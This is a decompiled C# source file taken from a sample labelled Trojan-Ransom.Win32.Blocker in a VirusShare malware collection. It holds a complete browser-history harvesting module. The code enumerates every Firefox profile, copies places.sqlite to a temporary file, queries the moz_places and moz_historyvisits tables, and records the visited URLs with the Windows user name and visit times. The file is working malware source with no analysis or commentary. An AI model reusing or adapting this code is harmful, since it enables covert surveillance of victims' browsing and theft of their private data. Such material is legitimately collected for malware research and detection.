// Decompiled with JetBrains decompiler
// Type: jimbii.FirefoxUrl
// Assembly: sysrt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F2102D52-57B0-4622-A1CB-9DE0B00E107F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.hehh-e9e3600777f319c90d3c06bee4af8f501eba42a876d1d5ed7d3de045ff7cba31.exe

using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

namespace jimbii
{
  internal class FirefoxUrl
  {
    public static string getLastVisited()
    {
      string lastVisited = "";
      DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0);
      foreach (KeyValuePair<string, HistoryEntry> keyValuePair in FirefoxUrl.GetURLCache())
      {
        if (keyValuePair.Value.LastAccessDate > dateTime)
        {
          lastVisited = keyValuePair.Value.Url;
          dateTime = keyValuePair.Value.LastAccessDate;
        }
      }
      return lastVisited;
    }

    public static Dictionary<string, HistoryEntry> GetURLCache()
    {
      try
      {
        Dictionary<string, HistoryEntry> list = new Dictionary<string, HistoryEntry>();
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
        if (Directory.Exists(path))
        {
          foreach (string directory in Directory.GetDirectories(path))
            FirefoxUrl.ExtractUserHistory(ref list, directory);
        }
        return list;
      }
      catch (Exception ex)
      {
        Trace.WriteLine("ERROR: FFHistory.GetURLCache() (" + ex.Message + ")");
        Trace.Flush();
        return (Dictionary<string, HistoryEntry>) null;
      }
    }

    private static void ExtractUserHistory(ref Dictionary<string, HistoryEntry> list, string folder)
    {
      try
      {
        DataTable fromTable1 = FirefoxUrl.ExtractFromTable("moz_places", folder);
        DataTable fromTable2 = FirefoxUrl.ExtractFromTable("moz_historyvisits", folder);
        string name = WindowsIdentity.GetCurrent().Name;
        string str = name.Substring(name.IndexOf("\\") + 1);
        foreach (DataRow row1 in (InternalDataCollectionBase) fromTable1.Rows)
        {
          DataRow dataRow = (DataRow) null;
          foreach (DataRow row2 in (InternalDataCollectionBase) fromTable2.Rows)
          {
            if (row2["place_id"].ToString() == row1["id"].ToString())
              dataRow = row2;
          }
          if (dataRow != null)
          {
            string key = row1["Url"].ToString();
            list.Add(key, new HistoryEntry()
            {
              Url = key,
              User = str,
              LastAccessDate = FirefoxUrl.ConvertFFStrToDate(dataRow["visit_date"].ToString())
            });
          }
        }
      }
      catch (Exception ex)
      {
        Trace.WriteLine("ERROR: FFHistory.ExtractUserHistory() (" + ex.Message + ")");
        Trace.Flush();
      }
    }

    private static DateTime ConvertFFStrToDate(string ffDate)
    {
      DateTime date = new DateTime(1970, 1, 1, 0, 0, 0);
      try
      {
        long num = Convert.ToInt64(ffDate) / 1000000L;
        return date.AddSeconds((double) num).AddHours(10.0);
      }
      catch (Exception ex)
      {
        Trace.WriteLine("ERROR: FFHistory.ConvertFFStrToDate() (" + ex.Message + ")");
        Trace.Flush();
        return date;
      }
    }

    private static DataTable ExtractFromTable(string table, string folder)
    {
      try
      {
        DataTable dataTable = new DataTable();
        string sourceFileName = folder + "\\places.sqlite";
        string tempFileName = Path.GetTempFileName();
        File.Copy(sourceFileName, tempFileName, true);
        if (File.Exists(tempFileName))
        {
          SQLiteConnection connection = new SQLiteConnection("Data Source=" + tempFileName + ";Version=3;New=False;Compress=True;");
          connection.Open();
          connection.CreateCommand();
          new SQLiteDataAdapter("select * from " + table, connection).Fill(dataTable);
          connection.Close();
        }
        File.Delete(tempFileName);
        return dataTable;
      }
      catch (Exception ex)
      {
        Trace.WriteLine("ERROR: FFHistory.ExtractFromTable() (" + ex.Message + ")");
        Trace.Flush();
        return new DataTable();
      }
    }
  }
}
